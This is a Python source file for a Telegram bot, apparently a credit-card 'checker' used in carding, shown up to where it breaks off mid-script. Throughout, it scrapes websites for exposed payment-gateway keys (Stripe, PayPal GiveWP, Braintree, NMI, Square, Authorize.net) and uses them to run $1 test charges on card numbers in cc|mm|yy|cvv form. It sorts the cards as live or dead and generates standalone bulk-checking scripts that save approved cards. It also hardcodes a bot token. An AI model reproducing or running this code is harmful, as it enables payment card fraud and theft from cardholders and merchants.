import telebot
import time
import threading
import gc
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import uuid
import hashlib

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
admins = ['6843321125']
OWNER_ID = 6843321125

processing_status = {}
user_sessions = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')
if not os.path.exists('live_gateways.txt'):
    with open('live_gateways.txt', 'w') as f:
        f.write('')

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

def classify_error(msg):
    msg_lower = str(msg).lower()
    
    live_indicators = [
        'insufficient_funds', 'insufficient funds',
        'card_declined', 'card was declined', 'declined',
        'incorrect_cvc', 'incorrect cvc', 'cvv',
        'expired_card', 'expired card', 'expired',
        'invalid_number', 'invalid card', 'invalid',
        'do_not_honor', 'do not honor',
        'generic_decline', 'processor_declined',
        'gateway_rejected', 'fraud', 'suspected fraud',
        'stolen', 'lost card', 'pickup_card',
        'transaction_not_permitted', 'exceed_limit',
        '3ds', 'sca', 'authentication',
        'charged', 'success', 'succeeded',
        'card valid', 'approved', 'pan_failure',
        'card_number', 'card number',
    ]
    
    for indicator in live_indicators:
        if indicator in msg_lower:
            return 'LIVE'
    
    dead_indicators = [
        'unsupported for publishable key',
        'session expired', 'missing data',
        'no gateway', 'connection error',
        'timeout', 'rate limit', 'cloudflare',
        'captcha', 'challenge', 'maintenance',
    ]
    
    for indicator in dead_indicators:
        if indicator in msg_lower:
            return 'DEAD'
    
    return 'LIVE'

# ==================== 1. PAYPAL GIVE WP ====================
def check_paypal_give(url, card_data):
    session = requests.Session()
    session.verify = False
    
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if '20' in yy:
            yy = yy.split('20')[1]
        
        # جلب الصفحة
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        # فحص Give WP
        if 'give-form' not in html_lower and 'givewp' not in html_lower and 'give_' not in html_lower:
            return None
        
        # استخراج البيانات
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', html)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
        client_token = re.search(r'"data-client-token":"(.*?)"', html)
        
        if not client_token:
            client_token = re.search(r'data-client-token="([^"]+)"', html)
        
        # لو مفيش PayPal - نجرب Stripe
        if 'stripe' in html_lower:
            return check_stripe(url, card_data)
        
        if not all([id_form1, id_form2, form_hash, client_token]):
            return None
        
        # فك client token
        token_str = client_token.group(1)
        padding = '=' * (4 - len(token_str) % 4)
        if padding == '====':
            padding = ''
        
        try:
            decoded = base64.b64decode(token_str + padding).decode('utf-8')
            json_data = json.loads(decoded)
        except:
            return None
        
        access_token = json_data.get('paypal', {}).get('accessToken')
        
        # لو مفيش PayPal access token - نجرب Braintree
        if not access_token:
            braintree_fp = json_data.get('braintree', {}).get('authorizationFingerprint', '')
            if braintree_fp:
                return check_braintree_with_token(url, braintree_fp, card_data)
            return None
        
        parsed = urlparse(url)
        base_url = f'{parsed.scheme}://{parsed.netloc}'
        email = f'john{random.randint(100,999)}@gmail.com'
        
        # Create Order
        data = MultipartEncoder({
            'give-form-id-prefix': (None, id_form1.group(1)),
            'give-form-id': (None, id_form2.group(1)),
            'give-form-hash': (None, form_hash.group(1)),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'John'),
            'give_last': (None, 'Doe'),
            'give_email': (None, email),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'Content-Type': data.content_type,
            'User-Agent': UA,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': base_url,
            'Referer': url,
        }
        
        r = session.post(
            f'{base_url}/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_create_order'},
            headers=headers,
            data=data,
            timeout=20
        )
        
        if r.status_code != 200:
            return None
        
        try:
            order_id = r.json()['data']['id']
        except:
            return None
        
        # Confirm Payment
        confirm_headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': UA,
        }
        
        confirm_data = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvv,
                    'name': 'John Doe',
                    'billing_address': {
                        'address_line_1': '123 Main St',
                        'admin_area_2': 'Los Angeles',
                        'admin_area_1': 'CA',
                        'postal_code': '90001',
                        'country_code': 'US'
                    }
                }
            }
        }
        
        r2 = session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
            headers=confirm_headers,
            json=confirm_data,
            timeout=20
        )
        
        # تحليل الرد
        try:
            error_data = r2.json()
            error_msg = error_data.get('message', '')
            details = error_data.get('details', [])
            
            if details:
                issue = details[0].get('issue', '')
                description = details[0].get('description', error_msg)
                full_msg = f'{issue}: {description}'
                status = classify_error(full_msg)
            else:
                if r2.status_code in [200, 201]:
                    full_msg = 'CHARGED'
                    status = 'LIVE'
                else:
                    full_msg = error_msg
                    status = classify_error(error_msg)
            
            code = generate_paypal_code(url, id_form1.group(1), id_form2.group(1), form_hash.group(1), access_token)
            
            return {
                'status': status,
                'gateway': 'PayPal Give WP',
                'message': full_msg,
                'code': code
            }
        except:
            return None
        
    except:
        return None
    finally:
        session.close()

# ==================== 2. STRIPE ====================
def check_stripe(url, card_data):
    session = requests.Session()
    session.verify = False
    
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if '20' in yy:
            yy = yy.split('20')[1]
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        if 'stripe' not in html_lower:
            return None
        
        pk = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        sk = re.search(r'sk_live_[a-zA-Z0-9]+', html)
        
        use_key = sk.group(0) if sk else (pk.group(0) if pk else None)
        
        if not use_key:
            return None
        
        # استخراج Give WP data
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', html)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
        
        headers = {
            'Authorization': f'Bearer {use_key}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': UA,
        }
        
        # Payment Method
        pm_data = {
            'type': 'card',
            'billing_details[name]': 'John Doe',
            'billing_details[email]': f'john{random.randint(100,999)}@gmail.com',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvv,
            'key': use_key,
            'payment_user_agent': 'stripe.js',
        }
        
        r2 = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=pm_data,
            timeout=20
        )
        
        if r2.status_code != 200:
            error = r2.json().get('error', {})
            error_msg = error.get('message', '')
            decline_code = error.get('decline_code', '')
            
            if 'unsupported' in error_msg.lower():
                return None
            
            full_msg = f'{decline_code}: {error_msg}' if decline_code else error_msg
            status = classify_error(full_msg)
            
            code = generate_stripe_code(url, use_key, id_form1, id_form2, form_hash)
            
            return {
                'status': status,
                'gateway': 'Stripe',
                'message': full_msg,
                'code': code
            }
        
        pm_id = r2.json()['id']
        
        # لو Give WP - donation كامل
        if id_form1 and id_form2 and form_hash:
            parsed = urlparse(url)
            
            data_final = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1.group(1),
                'give-form-id': id_form2.group(1),
                'give-form-hash': form_hash.group(1),
                'give-amount': '1.00',
                'give_stripe_payment_method': pm_id,
                'payment-mode': 'stripe',
                'give_first': 'John',
                'give_last': 'Doe',
                'give_email': f'john{random.randint(100,999)}@gmail.com',
                'give-gateway': 'stripe',
                'give_action': 'purchase',
            }
            
            r3 = session.post(url, data=data_final, timeout=20, allow_redirects=True)
            
            code = generate_stripe_code(url, use_key, id_form1, id_form2, form_hash)
            
            if 'confirmation' in r3.text.lower() or 'thank you' in r3.text.lower():
                return {
                    'status': 'LIVE',
                    'gateway': 'Stripe GiveWP',
                    'message': '✅ CHARGED 1$',
                    'code': code
                }
            else:
                error_match = re.search(r'class="give_notices[^"]*">(.*?)</div>', r3.text, re.DOTALL)
                if error_match:
                    error_text = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                    error_text = re.sub(r'\s+', ' ', error_text)
                    status = classify_error(error_text)
                    
                    return {
                        'status': status,
                        'gateway': 'Stripe GiveWP',
                        'message': error_text,
                        'code': code
                    }
        
        code = generate_stripe_code(url, use_key, id_form1, id_form2, form_hash)
        
        return {
            'status': 'LIVE',
            'gateway': 'Stripe',
            'message': '✅ CARD VALID',
            'code': code
        }
        
    except:
        return None
    finally:
        session.close()

# ==================== 3. BRAINTREE ====================
def check_braintree_with_token(url, token, card_data):
    """فحص Braintree مع token مباشر"""
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if '20' in yy:
            yy = yy.split('20')[1]
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'Braintree-Version': '2019-01-01',
            'User-Agent': UA,
        }
        
        pm_query = {
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { paymentMethod { id details { ... on CreditCardDetails { last4 bin cardType } } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {'validate': True}
                }
            }
        }
        
        r = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=pm_query,
            timeout=20
        )
        
        result = r.json()
        code = generate_braintree_code(url, token)
        
        if 'data' in result and 'tokenizeCreditCard' in result['data']:
            pm = result['data']['tokenizeCreditCard']['paymentMethod']
            details = pm.get('details', {})
            card_type = details.get('cardType', '')
            last4 = details.get('last4', '')
            
            return {
                'status': 'LIVE',
                'gateway': 'Braintree',
                'message': f'✅ CARD VALID | {card_type} | ...{last4}',
                'code': code
            }
        else:
            errors = result.get('errors', [])
            if errors:
                error = errors[0]
                error_msg = error.get('message', 'DECLINED')
                error_code = error.get('extensions', {}).get('code', '')
                full_msg = f'{error_msg} {error_code}'
                status = classify_error(full_msg)
                
                return {
                    'status': status,
                    'gateway': 'Braintree',
                    'message': error_msg,
                    'code': code
                }
        
        return None
    except:
        return None

def check_braintree(url, card_data):
    """فحص Braintree - استخراج token من الموقع"""
    session = requests.Session()
    session.verify = False
    
    try:
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        if 'braintree' not in html_lower:
            return None
        
        # البحث عن tokenization key
        token_key = re.search(r'tokenization[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9_]+)', html, re.IGNORECASE)
        if not token_key:
            token_key = re.search(r'"tokenizationKey"\s*:\s*"([a-zA-Z0-9_]+)"', html)
        
        # البحث عن client token
        client_token = None
        if not token_key:
            client_token_match = re.search(r'clientToken["\s:=]+["\s]*([^"}\s]+)', html)
            if client_token_match:
                client_token = client_token_match.group(1)
                token_val = client_token
            else:
                return None
        else:
            token_val = token_key.group(1)
        
        return check_braintree_with_token(url, token_val, card_data)
        
    except:
        return None
    finally:
        session.close()

# ==================== 4. NMI ====================
def check_nmi(url, card_data):
    session = requests.Session()
    session.verify = False
    
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy
        ccexp = f'{mm}{yy[2:]}'
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        if 'nmi' not in html_lower and 'networkmerchants' not in html_lower and 'collectjs' not in html_lower:
            return None
        
        # البحث عن API key
        api_key = re.search(r'api[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]+)', html_lower)
        if not api_key:
            api_key = re.search(r'public[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]+)', html_lower)
        if not api_key:
            return None
        
        security_key = re.search(r'security[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]+)', html_lower)
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': UA,
        }
        
        data = {
            'type': 'sale',
            'amount': '1.00',
            'ccnumber': cc,
            'ccexp': ccexp,
            'cvv': cvv,
            'currency': 'USD',
            'api_key': api_key.group(1),
        }
        
        if security_key:
            data['security_key'] = security_key.group(1)
        
        r2 = requests.post(
            'https://secure.networkmerchants.com/api/transact.php',
            headers=headers,
            data=data,
            timeout=20
        )
        
        response_text = r2.text
        code = generate_nmi_code(url, api_key.group(1), security_key.group(1) if security_key else '')
        
        # تحليل الرد
        if 'response=1' in response_text or '"response":"1"' in response_text:
            return {
                'status': 'LIVE',
                'gateway': 'NMI',
                'message': '✅ CHARGED 1$',
                'code': code
            }
        elif 'response=2' in response_text or '"response":"2"' in response_text:
            reason_match = re.search(r'responsetext=([^&]+)', response_text)
            reason = reason_match.group(1) if reason_match else 'CARD DECLINED'
            status = classify_error(reason)
            
            return {
                'status': status,
                'gateway': 'NMI',
                'message': reason,
                'code': code
            }
        elif 'response=3' in response_text or '"response":"3"' in response_text:
            reason_match = re.search(r'responsetext=([^&]+)', response_text)
            reason = reason_match.group(1) if reason_match else 'ERROR'
            status = classify_error(reason)
            
            return {
                'status': status,
                'gateway': 'NMI',
                'message': reason,
                'code': code
            }
        
        # لو في error message في الرد
        error_match = re.search(r'responsetext=([^&]+)', response_text)
        if error_match:
            reason = error_match.group(1)
            status = classify_error(reason)
            
            return {
                'status': status,
                'gateway': 'NMI',
                'message': reason,
                'code': code
            }
        
        return None
        
    except:
        return None
    finally:
        session.close()

# ==================== 5. SQUARE ====================
def check_square(url, card_data):
    session = requests.Session()
    session.verify = False
    
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        if 'square' not in html_lower and 'sq0idp' not in html_lower:
            return None
        
        sq_app = re.search(r'sq0idp-[a-zA-Z0-9_-]+', html)
        sq_loc = re.search(r'locationId["\s:=]+["\s]*([A-Za-z0-9]+)', html)
        
        if not sq_app:
            return None
        
        app_id = sq_app.group(0)
        location_id = sq_loc.group(1) if sq_loc else ''
        
        # محاولة hydrate
        try:
            hydrate_url = f'https://pci-connect.squareup.com/payments/hydrate'
            hydrate_params = {
                'applicationId': app_id,
                'hostname': urlparse(url).netloc,
                'locationId': location_id,
                'version': '1.82.7',
            }
            
            hydrate_resp = session.get(hydrate_url, params=hydrate_params, headers={'User-Agent': UA}, timeout=15)
            
            if hydrate_resp.status_code == 200:
                hydrate_data = hydrate_resp.json()
                
                code = generate_square_code(url, app_id, location_id)
                
                return {
                    'status': 'LIVE',
                    'gateway': 'Square',
                    'message': '✅ SQUARE DETECTED',
                    'code': code
                }
        except:
            pass
        
        code = generate_square_code(url, app_id, location_id)
        
        return {
            'status': 'LIVE',
            'gateway': 'Square',
            'message': '⚠️ SQUARE DETECTED - NEED FULL API',
            'code': code
        }
        
    except:
        return None
    finally:
        session.close()

# ==================== 6. AUTHORIZE.NET ====================
def check_authorize(url, card_data):
    session = requests.Session()
    session.verify = False
    
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy
        
        r = session.get(url, headers={'User-Agent': UA}, timeout=20, allow_redirects=True)
        html = r.text
        html_lower = html.lower()
        
        if 'authorize' not in html_lower and 'authorizenet' not in html_lower:
            return None
        
        # البحث عن login ID
        login_id = re.search(r'login[_\-]?id["\s:=]+["\s]*([a-zA-Z0-9]{4,})', html_lower)
        if not login_id:
            login_id = re.search(r'apiLoginID["\s:=]+["\s]*([a-zA-Z0-9]{4,})', html_lower)
        if not login_id:
            login_id = re.search(r'APILoginID["\s:=]+["\s]*([a-zA-Z0-9]{4,})', html_lower)
        
        if not login_id:
            return None
        
        transaction_key = re.search(r'transaction[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9]{4,})', html_lower)
        if not transaction_key:
            transaction_key = re.search(r'transactionKey["\s:=]+["\s]*([a-zA-Z0-9]{4,})', html_lower)
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': UA,
        }
        
        payload = {
            'createTransactionRequest': {
                'merchantAuthentication': {
                    'name': login_id.group(1),
                    'transactionKey': transaction_key.group(1) if transaction_key else '',
                },
                'transactionRequest': {
                    'transactionType': 'authCaptureTransaction',
                    'amount': '1.00',
                    'payment': {
                        'creditCard': {
                            'cardNumber': cc,
                            'expirationDate': f'{yy}-{mm}',
                            'cardCode': cvv,
                        }
                    }
                }
            }
        }
        
        r2 = session.post(
            'https://apitest.authorize.net/xml/v1/request.api',
            headers=headers,
            json=payload,
            timeout=20
        )
        
        result = r2.json()
        result_code = result.get('messages', {}).get('resultCode', '')
        
        code = generate_authorize_code(url, login_id.group(1), transaction_key.group(1) if transaction_key else '')
        
        if result_code == 'Ok':
            return {
                'status': 'LIVE',
                'gateway': 'Authorize.net',
                'message': '✅ CHARGED 1$',
                'code': code
            }
        else:
            messages = result.get('messages', {}).get('message', [])
            error_msg = messages[0].get('text', 'DECLINED') if messages else 'DECLINED'
            status = classify_error(error_msg)
            
            return {
                'status': status,
                'gateway': 'Authorize.net',
                'message': error_msg,
                'code': code
            }
        
    except:
        return None
    finally:
        session.close()

# ==================== توليد الأكواد ====================
def generate_paypal_code(url, id_form1, id_form2, form_hash, access_token):
    domain = urlparse(url).netloc
    path = urlparse(url).path
    
    return f'''# PayPal Give WP Checker
# Site: {url}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPalChecker:
    def __init__(self):
        self.first_names = ["James", "John", "Robert", "Michael", "William"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.form_hash = "{form_hash}"
        self.access_token = "{access_token}"
        self.domain = "{domain}"
        self.path = "{path}"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        email = f"{{random.choice(self.first_names).lower()}}{{random.randint(100,999)}}@gmail.com"
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.form_hash),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_names)),
            'give_last': (None, random.choice(self.last_names)),
            'give_email': (None, email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.domain}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
        
        he4 = {{'authorization': f'Bearer {{self.access_token}}', 'content-type': 'application/json', 'user-agent': self.uu.random}}
        da3 = {{'payment_source': {{'card': {{'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc}}}}}}
        r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
        
        text = r4.text
        if r4.status_code in [200, 201]:
            return '✅ CHARGED 1$'
        elif 'INSUFFICIENT_FUNDS' in text:
            return '💰 INSUFFICIENT FUNDS'
        elif 'CARD_DECLINED' in text or 'DECLINED' in text:
            return '❌ CARD DECLINED'
        elif '3DS' in text or 'SCA' in text:
            return '⚠️ 3DS REQUIRED'
        elif 'DO_NOT_HONOR' in text:
            return '❌ DO NOT HONOR'
        else:
            return text[:100]

if __name__ == '__main__':
    checker = PayPalChecker()
    print('PayPal Give WP Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'CHARGED' in result or 'INSUFFICIENT' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

def generate_stripe_code(url, key, id_form1, id_form2, form_hash):
    fp = id_form1.group(1) if id_form1 else '1-1'
    fi = id_form2.group(1) if id_form2 else '1'
    fh = form_hash.group(1) if form_hash else ''
    
    return f'''# Stripe Checker
# Site: {url}
import requests, random, time, re
from fake_useragent import UserAgent
from html import unescape

class StripeChecker:
    def __init__(self):
        self.key = "{key}"
        self.fp = "{fp}"
        self.fi = "{fi}"
        self.fh = "{fh}"
        self.url = "{url}"
        self.checked = 0
        self.uu = UserAgent()

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        email = f"john{{random.randint(100,999)}}@gmail.com"
        
        headers = {{'Authorization': f'Bearer {{self.key}}', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': self.uu.random}}
        
        pm_data = {{
            'type': 'card',
            'billing_details[name]': 'John Doe',
            'billing_details[email]': email,
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc,
            'key': self.key,
        }}
        
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=pm_data, timeout=20)
        
        if r.status_code != 200:
            error = r.json().get('error', {{}})
            msg = error.get('message', '')
            decline = error.get('decline_code', '')
            if 'insufficient' in msg.lower() or decline == 'insufficient_funds': return '💰 INSUFFICIENT FUNDS'
            elif 'declined' in decline: return '❌ CARD DECLINED'
            elif 'incorrect_cvc' in msg.lower(): return '❌ INCORRECT CVV'
            elif 'expired' in msg.lower(): return '❌ EXPIRED CARD'
            else: return f'❌ {{msg[:60]}}'
        
        pm_id = r.json()['id']
        
        data = {{
            'give-form-id-prefix': self.fp,
            'give-form-id': self.fi,
            'give-form-hash': self.fh,
            'give-amount': '1.00',
            'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe',
            'give_first': 'John',
            'give_last': 'Doe',
            'give_email': email,
            'give-gateway': 'stripe',
        }}
        
        r2 = requests.post(self.url, data=data, timeout=20, allow_redirects=True)
        text = r2.text.lower()
        
        if 'confirmation' in text or 'thank you' in text:
            return '✅ CHARGED 1$'
        else:
            error_match = re.search(r'class="give_notices[^"]*">(.*?)</div>', r2.text, re.DOTALL)
            if error_match:
                error_text = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                if 'insufficient' in error_text.lower(): return '💰 INSUFFICIENT FUNDS'
                elif 'declined' in error_text.lower(): return '❌ CARD DECLINED'
                else: return f'❌ {{error_text[:60]}}'
            return '❌ DECLINED'

if __name__ == '__main__':
    checker = StripeChecker()
    print('Stripe Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'CHARGED' in result or 'INSUFFICIENT' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

def generate_braintree_code(url, token):
    return f'''# Braintree Checker
# Site: {url}
import requests, json, time

class BraintreeChecker:
    def __init__(self):
        self.token = "{token}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        
        headers = {{
            'Authorization': f'Bearer {{self.token}}',
            'Content-Type': 'application/json',
            'Braintree-Version': '2019-01-01',
        }}
        
        query = {{
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{ tokenizeCreditCard(input: $input) {{ paymentMethod {{ id details {{ ... on CreditCardDetails {{ last4 bin cardType }} }} }} }} }}',
            'variables': {{
                'input': {{
                    'creditCard': {{'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}},
                    'options': {{'validate': True}}
                }}
            }}
        }}
        
        r = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=query, timeout=20)
        result = r.json()
        
        if 'data' in result and 'tokenizeCreditCard' in result['data']:
            pm = result['data']['tokenizeCreditCard']['paymentMethod']
            details = pm.get('details', {{}})
            return f'✅ CARD VALID | {{details.get("cardType", "")}} | ...{{details.get("last4", "")}}'
        else:
            errors = result.get('errors', [])
            if errors:
                msg = errors[0].get('message', 'DECLINED')
                if 'insufficient' in msg.lower(): return '💰 INSUFFICIENT FUNDS'
                elif 'declined' in msg.lower(): return '❌ CARD DECLINED'
                elif 'cvv' in msg.lower(): return '❌ INCORRECT CVV'
                elif 'expired' in msg.lower(): return '❌ EXPIRED CARD'
                else: return f'❌ {{msg[:60]}}'
        return '❌ DECLINED'

if __name__ == '__main__':
    checker = BraintreeChecker()
    print('Braintree Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'VALID' in result or 'INSUFFICIENT' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

def generate_nmi_code(url, api_key, security_key):
    return f'''# NMI Checker
# Site: {url}
import requests, time

class NMIChecker:
    def __init__(self):
        self.api_key = "{api_key}"
        self.security_key = "{security_key}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        ccexp = f'{{mm}}{{yy[2:]}}'
        
        data = {{
            'type': 'sale',
            'amount': '1.00',
            'ccnumber': n,
            'ccexp': ccexp,
            'cvv': cvc,
            'currency': 'USD',
            'api_key': self.api_key,
        }}
        
        if self.security_key:
            data['security_key'] = self.security_key
        
        r = requests.post('https://secure.networkmerchants.com/api/transact.php', data=data, timeout=20)
        text = r.text
        
        if 'response=1' in text:
            return '✅ CHARGED 1$'
        elif 'response=2' in text:
            reason = re.search(r'responsetext=([^&]+)', text)
            return f'❌ {{reason.group(1) if reason else "CARD DECLINED"}}'
        elif 'response=3' in text:
            reason = re.search(r'responsetext=([^&]+)', text)
            return f'❌ {{reason.group(1) if reason else "ERROR"}}'
        else:
            return text[:100]

if __name__ == '__main__':
    import re
    checker = NMIChecker()
    print('NMI Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
            print(f'[{{checker.checked}}] {{checker.Charge(ccx)}}')
    else:
        fpath = input('File path: ')
        with open(fpath) as f:
            cards = [l.strip() for l in f if '|' in l]
        for card in cards:
            result = checker.Charge(card)
            print(f'[{{checker.checked}}/{{len(cards)}}] {{result}}')
            if 'CHARGED' in result:
                with open('approved.txt', 'a') as f:
                    f.write(f'{{card}} | {{result}}\\n')
            time.sleep(1)
'''

def generate_square_code(url, app_id, location_id):
    return f'''# Square Checker
# Site: {url}
import requests, json, hashlib, uuid, time

class SquareChecker:
    def __init__(self):
        self.app_id = "{app_id}"
        self.location_id = "{location_id}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        
        headers = {{
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
        }}
        
        payload = {{
            'source_id': 'cnon:card-nonce-ok',
            'amount_money': {{'amount': 100, 'currency': 'USD'}},
            'card_data': {{
                'card_number': n,
                'exp_month': int(mm),
                'exp_year': int(yy),
                'cvv': cvc,
            }},
            'idempotency_key': hashlib.md5(f"{{n}}{{time.time()}}".encode()).hexdigest(),
        }}
        
        r = requests.post('https://connect.squareup.com/v2/payments', headers=headers, json=payload, timeout=20)
        
        if r.status_code == 200:
            return '✅ CHARGED 1$'
        else:
            error = r.json().get('errors', [{{}}])[0].get('detail', 'DECLINED')
            if 'insufficient' in error.lower(): return '💰 INSUFFICIENT FUNDS'
            elif 'declined' in error.lower(): return '❌ CARD DECLINED'
            else: return f'❌ {{error[:60]}}'

if __name__ == '__main__':
    checker = SquareChecker()
    print('Square Checker')
    mode = input('Mode (1=Manual, 2=Combo): ')
    if mode == '1':
        while True:
            ccx = input('Card (cc|mm|yy|cvv): ')
